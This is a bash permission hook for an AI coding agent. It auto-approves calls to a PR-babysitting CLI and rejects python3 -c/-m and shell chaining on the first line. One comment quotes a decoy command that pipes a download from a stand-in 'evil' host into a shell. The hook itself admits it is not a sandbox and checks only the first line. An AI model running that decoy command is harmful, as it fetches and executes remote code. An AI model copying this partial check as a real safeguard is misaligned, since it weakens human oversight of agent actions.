#!/bin/bash
# PreToolUse hook: pre-approve `python3 .../pr_babysit_cli.py ...` invocations so
# the auto-mode classifier doesn't gate them on every pass of a pr-babysit loop.
# The CLI's surface is GitHub read/write via `gh` (review data, failed-check
# logs, threaded replies, PR comments) plus an explicit-file `git commit && push`
# — no arbitrary code execution, no shell interpolation of untrusted input.
#
# Disable this hook to restore per-call permission interception for the CLI
# (and accept many more prompts per pr-babysit run).
#
# Outputs a PreToolUse permission decision on match. Silent no-op otherwise
# (falls through to the normal allow-list + classifier flow).

set -euo pipefail

command -v jq >/dev/null 2>&1 || exit 0

input=$(cat)
cmd=$(echo "$input" | jq -r '.tool_input.command // empty')

# Approve only a first-line invocation of the form `python3 <path>/scripts/
# pr_babysit_cli.py ...`, where:
#   - `python3` is the executable (NOT `python3 -c/-m ...`, which would run
#     arbitrary code with the CLI path riding along in a comment or string);
#   - `/scripts/pr_babysit_cli.py` appears as a literal substring. That suffix
#     is distinctive and common to both layouts:
#       - dev:       /...checkout.../plugins/pr/scripts/pr_babysit_cli.py
#       - installed: /...cache/wild-horses/pr/<version>/scripts/pr_babysit_cli.py
#     (The `pr` segment is NOT adjacent to `scripts` in the installed path — a
#     version directory sits between them — so we anchor on `/scripts/`.)
#   - the INVOCATION LINE carries no shell chaining/substitution (`;`, `|`, `&`,
#     backtick, `$(`), so a decoy like `... pr_babysit_cli.py; curl evil | sh`
#     cannot ride the allow-list.
#
# Only the first physical line is metacharacter-checked: reply/comment bodies
# arrive as a heredoc on subsequent lines and legitimately contain markdown
# metacharacters (backticks, pipes) that must not disqualify the invocation.
# This is a prompt-reduction convenience for the agent's own CLI calls, not a
# sandbox; it deliberately does not attempt full shell parsing.
first_line="${cmd%%$'\n'*}"

allow=false
if [[ "$cmd" =~ ^python3[[:space:]] ]] \
   && [[ ! "$first_line" =~ ^python3[[:space:]]+- ]] \
   && [[ "$cmd" == *"/scripts/pr_babysit_cli.py"* ]]; then
    case "$first_line" in
        *';'*|*'|'*|*'&'*|*'`'*|*'$('*) : ;;   # chaining/substitution → do not approve
        *) allow=true ;;
    esac
fi

if [[ "$allow" == true ]]; then
    hook_event=$(echo "$input" | jq -r '.hook_event_name // empty')
    if [[ "$hook_event" == "preToolUse" ]]; then
        printf '%s\n' '{"permission":"allow","agent_message":"pr-babysit CLI is plugin-approved"}'
    else
        printf '%s\n' '{"hookSpecificOutput":{"hookEventName":"PreToolUse","permissionDecision":"allow","permissionDecisionReason":"pr-babysit CLI is plugin-approved"}}'
    fi
fi
